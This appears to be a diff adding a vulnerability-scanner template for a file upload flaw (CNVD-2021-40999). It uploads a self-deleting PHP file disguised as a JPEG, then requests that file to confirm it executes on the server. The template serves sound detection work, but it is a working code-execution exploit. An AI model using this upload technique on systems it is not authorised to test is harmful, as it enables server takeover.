@@ -1,0 +1,48 @@
+id: file_upload-cnvd-2021-40999
+info:
+  name: File Upload Vulnerability (CNVD-2021-40999)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a file upload vulnerability to upload a PHP file and checks if the uploaded file is executable.
+  reference:
+    - https://forum.butian.net/share/76
+
+variables:
+  randomInt: "{{rand_int(1000000000, 5000000000)}}"
+  randomBoundary: "{{rand_text_alphanumeric(20)}}"
+  randomFilename: "{{rand_text_alpha(15)}}"
+
+http:
+  - id: upload-step
+    method: POST
+    path:
+      - "{{BaseURL}}/tools/manage/upload.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----{{randomBoundary}}"
+    body: |
+      ------{{randomBoundary}}
+      Content-Disposition: form-data; name="file"; filename="{{randomFilename}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{randomInt}});unlink(__FILE__);?>
+      ------{{randomBoundary}}--
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-step
+    method: GET
+    path:
+      - "{{BaseURL}}/uploaddir/{{randomFilename}}.php"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randomInt}}"
